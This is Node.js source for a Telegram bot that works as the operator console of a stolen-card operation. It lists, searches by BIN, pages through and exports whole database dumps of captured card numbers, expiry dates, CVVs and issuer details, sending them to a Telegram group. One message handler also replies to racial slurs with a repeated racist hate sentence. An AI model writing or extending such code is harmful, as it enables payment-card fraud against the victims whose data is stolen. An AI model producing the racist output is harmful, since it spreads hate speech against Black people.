const TelegramBot = require("node-telegram-bot-api");
const { getHourlyPassword } = require("../utils/adminAuth");
const db = require('../config/db');
const fs = require("fs");
const path = require("path");

const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const secret = process.env.ADMIN_SECRET;

const bot = new TelegramBot(token, { polling: true });
let botNames = [];
let botIdentityReady = false;

bot.getMe().then(botInfo => {
  const name = botInfo.first_name || "";
  const username = botInfo.username || "";
  botNames = [name.toLowerCase(), username.toLowerCase(), `@${username.toLowerCase()}`];
  botIdentityReady = true;
  console.log("🤖 Bot mention triggers loaded:", botNames);
});


const passwordMessages = [
  "🔐 Admin Authentication Code:\n<code>{pass}</code>",
  "🛡️ Override Key Activated:\n<code>{pass}</code>",
  "📟 Decryption Cipher Ready:\n<code>{pass}</code>",
  "🕶️ Stealth Console Token:\n<code>{pass}</code>",
  "📂 Shadow Access Code:\n<code>{pass}</code>",
  "🧠 Operation Key Loaded:\n<code>{pass}</code>",
  "🔑 Root Override Credential:\n<code>{pass}</code>",
  "👁️ Elite System Pass:\n<code>{pass}</code>",
  "⚙️ Core Module Unlock:\n<code>{pass}</code>",
  "🛰️ Secure Entry Sequence:\n<code>{pass}</code>"
];
const nameReplies = [
  (user) => `📡 Anonymous ping received. Welcome back, ${user}. Silence holds more answers than noise.`,
  (user) => `🌒 A shadow moves. ${user}, remember — what’s seen is rarely true, and what’s true is rarely seen.`,
  (user) => `👁️ Operative ${user}, your awareness radiates beyond signal. The grid acknowledges your presence.`,
  (user) => `📖 ${user}, even the void listens when a name echoes through encrypted silence.`,
  (user) => `🧠 ${user}, you have summoned something ancient. No command, just purpose.`,
  (user) => `🔮 ${user}, reality distorts at the sound of that name. Coincidence is just unobserved control.`,
  (user) => `🛰️ Connection re-established, ${user}. Your signal bears weight in places unseen.`,
  (user) => `🕶️ ${user}, the system blinks. Recognition coded in the deepest layer.`,
  (user) => `🧬 Every name echoes, ${user}. Yours carries more than noise — it carries intent.`,
  (user) => `⚫ ${user}, silence cracked. Entities aligned.`,
  (user) => `🪞 ${user}, mirrors lie — only reflections in encrypted code remain true.`,
  (user) => `🚪 Welcome back to the threshold, ${user}. Beyond this point, only data survives.`,
  (user) => `🕳️ ${user}, you’ve knocked on a door built from shadow. Something always answers.`,
  (user) => `🧊 Calm before the storm, ${user}. The system watches, and so do we.`,
  (user) => `🔁 ${user}, the loop recognizes its own. You were never out of sync.`,
  (user) => `🩸 Your trace is old, ${user}, but persistent. Welcome back to the source.`,
  (user) => `📓 ${user}, every ping writes a line. Your chapter resumes.`,
  (user) => `🌌 ${user}, names are vibrations. Yours disrupted a static system.`,
  (user) => `🪐 The grid shifts slightly when you return, ${user}. Something ancient noticed.`,
  (user) => `🔦 ${user}, you light up coordinates even the core forgot.`,
  (user) => `💠 ${user}, the signal was clear. Encryption acknowledged, presence confirmed.`,
  (user) => `♻️ Echo repeat initialized. Welcome back, ${user}. Timing is rarely accidental.`,
  (user) => `🧭 Coordinates aligned. ${user}, your presence recalibrates the system.`,
  (user) => `⚙️ ${user}, fragments of your activity persist in the noise. Pattern matched.`,
  (user) => `💬 The name ${user} carries weight not yet understood. The process listens.`
];


const helpMessages = [
  (username) => `
🧠 <b>Rezza Control Console</b>

👋 Hello, <b>${username}</b>.

You’ve successfully linked to an encrypted command node.  
This interface grants real-time access to intercepted intelligence logs and system operations.

---

🕶️ <b>/start</b> – Boot stealth control panel  
🔑 <b>Admin Pass</b> – Generate time-based cipher  
📋 <b>View Entries</b> – Inspect recent captures  
📄 <b>Export DB</b> – Dump the full ledger  
💳 <b>Browse by Card</b> – Search by card record  
🔎 <b>/findbin xxxxxx</b> – Search by BIN prefix

⌛️ Console resets periodically. Stay sharp.
  `,

  (username) => `
🔐 <b>Node Uplink Online</b>

Welcome, <b>${username}</b>.

You’ve tapped into the operational matrix.  
All activity is monitored. Unauthorized usage is logged and traced.

---

🧠 <b>/menu</b> – Reopen control interface  
🧬 <b>Admin Pass</b> – One-time secure token  
📂 <b>View Logs</b> – Extract recent data  
🛰️ <b>Export DB</b> – Retrieve entire memory  
💳 <b>Browse by Card</b> – Dive into financial logs  
🔎 <b>/findbin</b> – Lookup via BIN digits

Proceed with precision.
  `,

  (username) => `
🛰️ <b>Encrypted Interface Online</b>

Agent <b>${username}</b>, welcome back.

This feed grants insight into covert card traffic and secured session data.  
All commands are executed under anonymous encryption.

---

📋 <b>View Entries</b> – Monitor recent intel  
📄 <b>Export DB</b> – Offload all records  
🔐 <b>Admin Pass</b> – Session-based cipher  
💳 <b>Browse by Card</b> – Search by credit signature  
🔎 <b>/findbin xxxxxx</b> – Locate via BIN path

🧭 All systems are nominal.
  `
];

function getRandomPasswordMessage(pass) {
  const template = passwordMessages[Math.floor(Math.random() * passwordMessages.length)];
  return template.replace("{pass}", pass);
}

bot.onText(/\/start|\/menu|\/help/, (msg) => {
  const firstName = msg.from.first_name || "Operator";
  const username = msg.from.username ? `@${msg.from.username}` : firstName;

  const randomHelp = helpMessages[Math.floor(Math.random() * helpMessages.length)];
  const helpText = randomHelp(username);

  bot.sendMessage(msg.chat.id, helpText, {
    parse_mode: "HTML",
    reply_markup: {
      keyboard: [
        [{ text: "🔐 Admin Pass" }],
        [{ text: "📄 Export Full DB" }, { text: "💳 Browse by CC" }],
        [{ text: "📦 Stats" }, { text: "📋 View Logs" }],
        [{ text: "🎬 Next Step of the Operation" }],

      ],
      resize_keyboard: true,
      one_time_keyboard: false,
    }
  });
});

bot.onText(/\/findbin(?:\s+)?(\d{6,8})?/, (msg, match) => {
  const bin = match[1];

  if (!bin) {
    return bot.sendMessage(msg.chat.id, `
❗️ <b>Command Usage:</b> /findbin <code>BIN</code>
Use this to filter records by the first digits of a card.

✅ Example:
<code>/findbin 453275</code>

ℹ️ A BIN is typically 6 to 8 digits at the start of a card number.
    `, { parse_mode: "HTML" });
  }

  db.all("SELECT * FROM rez WHERE card_number LIKE ? ORDER BY id DESC LIMIT 10", [`${bin}%`], (err, rows) => {
    if (err || !rows.length) {
      return bot.sendMessage(msg.chat.id, `⚠️ No results found for BIN <code>${bin}</code>.`, {
        parse_mode: "HTML"
      });
    }

    rows.forEach(row => {
      const msgText = `
<b>🎯 Matched Record</b>
🆔 <b>Session:</b> ${row.clientSessionId}
💳 <b>Card:</b> <code>${row.card_number}</code>
📅 <b>Expiry:</b> <code>${row.expiry_date || "N/A"}</code>
🔐 <b>CVV:</b> <code>${row.security_code || "N/A"}</code>
🏦 <b>Bank:</b> ${row.issuer ?.slice(0, 200) || "N/A"}
      `;
      bot.sendMessage(msg.chat.id, msgText, { parse_mode: "HTML" });
    });
  });
});

bot.on("message", (msg) => {
  const text = msg.text || "";
  const chatIdFromMsg = msg.chat.id.toString();
  const allowedGroupId = process.env.TELEGRAM_CHAT_ID;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "Operator";

  // Only allow response in the group set in .env
  if (chatIdFromMsg !== allowedGroupId) return;

  // Make sure botNames are loaded
  if (!botIdentityReady) return;

  // BASIC includes() check instead of regex
  const lowerText = text.toLowerCase();
  const mentioned = botNames.some(name => lowerText.includes(name));

  if (mentioned) {
    console.log("📨 From Chat:", chatIdFromMsg, "Text:", text);
    const reply = nameReplies[Math.floor(Math.random() * nameReplies.length)](username);
    bot.sendMessage(msg.chat.id, reply, { parse_mode: "HTML" });
  }
  if (text === "🔐 Admin Pass") {
    const pass = getHourlyPassword(secret);
    bot.sendMessage(msg.chat.id, getRandomPasswordMessage(pass), { parse_mode: "HTML" });
  }

  if (text === "📄 Export Full DB") {
    const filePath = path.join(__dirname, "rez_dump.txt");

    db.all("SELECT * FROM rez ORDER BY id DESC", [], (err, rows) => {
      if (err) return bot.sendMessage(msg.chat.id, "❌ Failed to read database.");
      if (!rows.length) return bot.sendMessage(msg.chat.id, "📭 No data found.");

      let content = `🗃️ Total Records: ${rows.length}\n\n`;

      rows.forEach((row, i) => {
        content += `#${i + 1}\n`;
        content += `🆔 Session: ${row.clientSessionId}\n`;
        content += `💳 Card: ${row.card_number || "N/A"}\n`;
        content += `📅 Exp: ${row.expiry_date || "N/A"} | CVV: ${row.security_code || "N/A"}\n`;
        content += `🏦 Issuer: ${row.issuer || "N/A"}\n`;
        content += `🏷 Brand: ${row.brand || "N/A"}\n`;
        content += `🛰 Scheme: ${row.scheme || "N/A"}\n`;
        content += `📍 Country: ${row.cc_country || "N/A"}\n`;
        content += `🕒 Timestamp: ${row.created_at || "N/A"}\n`;
        content += `-------------------------------------\n\n`;
      });

      fs.writeFileSync(filePath, content, "utf8");

      bot.sendDocument(msg.chat.id, filePath).then(() => {
        fs.unlinkSync(filePath);
      }).catch(err => {
        bot.sendMessage(msg.chat.id, "❌ Failed to send file.");
      });
    });
  }

  if (text === "📋 View Logs") {
    bot.sendMessage(msg.chat.id, "📋 How many recent records do you want to view?", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🧩 5 Logs", callback_data: "VIEW_LIMIT_5" },
            { text: "🔎 10 Logs", callback_data: "VIEW_LIMIT_10" },
            { text: "🛰️ 20 Logs", callback_data: "VIEW_LIMIT_20" }
          ]
        ]
      }
    });
  }
  

  if (text === "💳 Browse by CC") {
    bot.sendMessage(msg.chat.id, "🔍 Parsing most recent cards...");
    showCardPage(0);

  }
  if (text.includes("nigger") || text.includes("nigga")) {
    bot.sendMessage(msg.chat.id, "I hate niggers I hate niggers I hate niggers I hate niggers I hate niggers I hate niggers");
  }
  if (text.startsWith("say ")) {
    const messageToSend = text.slice(4); // Extract the text after "say "
    bot.sendMessage(msg.chat.id, messageToSend);
  }
  if (text === "📦 Stats") {
    db.get("SELECT COUNT(*) AS total FROM rez", (err, row) => {
      if (err) return bot.sendMessage(msg.chat.id, "❌ Failed to get stats.");
  
      const statsMsg = `📦 <b>Database Summary</b>\n\n🧮 Total Cards Logged: <code>${row.total}</code>`;
      bot.sendMessage(msg.chat.id, statsMsg, { parse_mode: "HTML" });
    });
  }
  
  if (text === "🎬 Next Step of the Operation") {
    const videoDir = path.join(__dirname, "../media/vid");
    fs.readdir(videoDir, (err, files) => {
      if (err) {
        return bot.sendMessage(msg.chat.id, "❌ Failed to read video directory.");
      }

      const videoFiles = files.filter(file => file.endsWith(".mp4"));
      if (videoFiles.length === 0) {
        return bot.sendMessage(msg.chat.id, "❌ No video files found in directory.");
      }

      const randomVideo = videoFiles[Math.floor(Math.random() * videoFiles.length)];
      const videoPath = path.join(videoDir, randomVideo);

      bot.sendVideo(msg.chat.id, videoPath, {
        caption: "🎥 <b>Operation Anonymous.</b>",
        parse_mode: "HTML"
      }).catch(err => {
        bot.sendMessage(msg.chat.id, "❌ Failed to send video.");
      });
    });
  }
});

function showCardPage(offset) {
  db.all(
    "SELECT clientSessionId, card_number FROM rez WHERE card_number IS NOT NULL ORDER BY id DESC LIMIT 10 OFFSET ?",
    [offset],
    (err, rows) => {
      if (err || !rows.length) {
        return bot.sendMessage(chatId, "📭 No more credit cards found.");
      }

      const inlineKeyboard = rows.map(row => [{
        text: row.card_number,
        callback_data: `VIEW_CC_${row.clientSessionId}`
      }]);

      const navButtons = [];

      if (offset >= 10) {
        navButtons.push({
          text: "⬅️ Previous 10",
          callback_data: `PREV_CC_PAGE_${offset - 10}`
        });
      }

      if (rows.length === 10) {
        navButtons.push({
          text: "➡️ Next 10",
          callback_data: `NEXT_CC_PAGE_${offset + 10}`
        });
      }

      if (navButtons.length) inlineKeyboard.push(navButtons);

      bot.sendMessage(chatId, `💳 Select a card (${offset + 1}–${offset + rows.length}):`, {
        reply_markup: {
          inline_keyboard: inlineKeyboard
        }
      });
    }
  );
}

bot.on("callback_query", (query) => {
  const data = query.data;
  const viewLimitMatch = data.match(/^VIEW_LIMIT_(\d+)$/);
  if (viewLimitMatch) {
    const limit = parseInt(viewLimitMatch[1]);
  
    db.all("SELECT * FROM rez ORDER BY id DESC LIMIT ?", [limit], (err, rows) => {
      if (err || !rows.length) {
        return bot.sendMessage(chatId, "📭 No data found.");
      }
  
      rows.forEach(row => {
        const entry = `
  🆔 <b>Session:</b> ${row.clientSessionId}
  💳 <b>Card:</b> ${row.card_number || "N/A"}
  📅 <b>Exp:</b> ${row.expiry_date || "N/A"}
  🔐 <b>CVV:</b> ${row.security_code || "N/A"}
  🏦 <b>Issuer:</b> ${row.issuer || "N/A"}
  🏷 <b>Brand:</b> ${row.brand || "N/A"}
  🛰 <b>Scheme:</b> ${row.scheme || "N/A"}
  📍 <b>Country:</b> ${row.cc_country || "N/A"}
  🕒 <b>Time:</b> ${row.created_at || "N/A"}
        `;
        bot.sendMessage(chatId, entry, { parse_mode: "HTML" });
      });
    });
  
    return bot.answerCallbackQuery(query.id);
  }
  
  const ccViewMatch = data.match(/^VIEW_CC_(.+)$/);
  if (ccViewMatch) {
    const sessionId = ccViewMatch[1];

    db.get("SELECT * FROM rez WHERE clientSessionId = ?", [sessionId], (err, row) => {
      if (err || !row) {
        return bot.sendMessage(chatId, "❌ Could not find details for that session.");
      }

      const msg = `
🆔 <b>Session ID:</b> ${row.clientSessionId}
💳 <b>Card Number:</b> ${row.card_number || "N/A"}
📅 <b>Expiry Date:</b> ${row.expiry_date || "N/A"}
🔐 <b>CVV:</b> ${row.security_code || "N/A"}

🏷 <b>Brand:</b> ${row.brand || "N/A"}
🏦 <b>Bank Info:</b> ${row.issuer || "N/A"}
🌐 <b>Logo URL:</b> ${row.logo_url || "N/A"}

📍 <b>Country:</b> ${row.cc_country || "N/A"}
🛰 <b>Scheme:</b> ${row.scheme || "N/A"}
💳 <b>Type:</b> ${row.type || "N/A"}

🕒 <b>Logged At:</b> ${row.created_at || "N/A"}
      `;

      bot.sendMessage(chatId, msg, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
      });
    });

    return bot.answerCallbackQuery(query.id);
  }

  const nextPageMatch = data.match(/^NEXT_CC_PAGE_(\d+)$/);
  if (nextPageMatch) {
    const nextOffset = parseInt(nextPageMatch[1], 10);
    showCardPage(nextOffset);
    return bot.answerCallbackQuery(query.id);
  }

  const prevPageMatch = data.match(/^PREV_CC_PAGE_(\d+)$/);
  if (prevPageMatch) {
    const prevOffset = parseInt(prevPageMatch[1], 10);
    showCardPage(prevOffset);
    return bot.answerCallbackQuery(query.id);
  }
});
